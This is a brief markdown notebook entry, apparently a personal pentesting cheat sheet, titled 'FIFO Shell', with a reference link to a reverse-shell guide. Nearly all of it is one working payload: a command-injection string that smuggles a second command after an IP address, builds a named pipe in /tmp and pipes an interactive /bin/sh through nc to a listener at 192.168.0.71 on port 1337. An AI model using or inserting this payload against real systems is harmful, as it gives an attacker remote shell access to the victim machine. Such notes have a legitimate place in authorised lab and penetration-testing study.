### FIFO Shell
 Creates a reverse shell using FIFO (First In, First Out) named pipes.
```bash
8.8.8.8; rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 192.168.0.71 1337 >/tmp/f
```
![[Pasted image 20251117173102.png]]


##### Reference:
[Reverse Shell Medium](https://medium.com/@learntheshell/reverse-shells-a-practical-guide-af1815bc3127)
